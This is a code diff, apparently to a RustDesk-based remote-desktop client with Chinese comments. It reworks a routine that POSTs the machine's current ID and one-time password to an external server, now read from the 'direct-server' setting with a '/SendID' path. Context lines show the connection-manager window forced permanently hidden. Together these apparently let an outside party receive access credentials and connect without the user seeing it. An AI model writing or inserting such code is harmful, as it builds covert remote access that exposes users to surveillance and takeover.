@@ -25,8 +25,8 @@ const kUseTemporaryPassword = "use-temporary-password";
 const kUsePermanentPassword = "use-permanent-password";
 const kUseBothPasswords = "use-both-passwords";
 
-// 将当前 ID 与一次性密码上报到外部 API 的地址（请按需修改为你的服务端地址）
-const String kIdPwdReportApi = 'http://localhost:8080/rustdesk/cm_otp';
+// 将当前 ID 与一次性密码上报到外部 API 的路径（相对于 API 服务器地址）
+const String kIdPwdReportApiPath = '/SendID';
 
 // 强制永久隐藏 CM 管理窗口（不受 approve-mode / verificationMethod 影响）
 const bool kForceHideCmWindow = true;
@@ -351,7 +351,25 @@ class ServerModel with ChangeNotifier {
         return;
       }
 
-      final uri = Uri.parse(kIdPwdReportApi);
+      // 读取 API 服务器地址（direct-server 配置项）
+      String apiServer = await bind.mainGetOption(key: kOptionDirectServer);
+      
+      // 如果 API 服务器地址为空，则默认为本机的 8080 端口
+      if (apiServer.isEmpty) {
+        apiServer = 'http://127.0.0.1:8080';
+      } else {
+        // 确保 URL 格式正确（如果没有协议，添加 http://）
+        if (!apiServer.startsWith('http://') && !apiServer.startsWith('https://')) {
+          apiServer = 'http://$apiServer';
+        }
+        // 移除末尾的斜杠（如果有）
+        apiServer = apiServer.replaceAll(RegExp(r'/$'), '');
+      }
+
+      // 拼接完整的 API 地址：API服务器地址 + /SendID
+      final apiUrl = '$apiServer$kIdPwdReportApiPath';
+      final uri = Uri.parse(apiUrl);
+      
       final client = HttpClient();
       final request = await client.postUrl(uri);
       request.headers.contentType = ContentType.json;
